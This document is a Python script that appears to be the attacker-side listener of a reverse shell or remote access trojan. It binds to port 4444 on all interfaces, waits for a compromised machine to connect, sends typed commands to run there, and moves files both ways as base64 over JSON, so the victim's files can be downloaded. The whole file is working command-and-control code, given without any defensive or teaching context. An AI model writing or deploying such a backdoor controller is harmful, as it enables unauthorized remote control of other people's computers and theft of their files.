#!/usr/bin/env python
import socket
import json
import base64
import sys
try:
    user_input = raw_input
except NameError:
    user_input = input

class Listener:

    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(0)
        print('[+] Waiting for incoming connections')
        self.connection, address = listener.accept()
        print('[+] Got a connection from ' + str(address))

    def reliable_send(self, data):
        json_data = json.dumps(data)
        if hasattr(json_data, 'encode'):
            json_data = json_data.encode('utf-8')
        self.connection.send(json_data)

    def reliable_receive(self):
        json_data = b''
        while True:
            try:
                chunk = self.connection.recv(1024)
                json_data = json_data + chunk
                return json.loads(json_data.decode('utf-8'))
            except (ValueError, UnicodeDecodeError):
                continue

    def execute_remotely(self, command):
        self.reliable_send(command)
        if command[0] == 'exit':
            self.connection.close()
            sys.exit()
        return self.reliable_receive()

    def write_file(self, path, content):
        with open(path, 'wb') as file:
            file.write(base64.b64decode(content))
            return '[+] Download successful.'

    def read_file(self, path):
        with open(path, 'rb') as file:
            encoded = base64.b64encode(file.read())
            if hasattr(encoded, 'decode'):
                encoded = encoded.decode('utf-8')
            return encoded

    def run(self):
        while True:
            command = user_input('>> ')
            command = command.split(' ')
            try:
                if command[0] == 'upload':
                    file_content = self.read_file(command[1])
                    command.append(file_content)
                result = self.execute_remotely(command)
                if command[0] == 'download' and '[-] Error ' not in str(result):
                    result = self.write_file(command[1], result)
            except Exception as e:
                result = '[-] Error during command execution: ' + str(e)
            print(result)
if __name__ == '__main__':
    my_listener = Listener('0.0.0.0', 4444)
    my_listener.run()
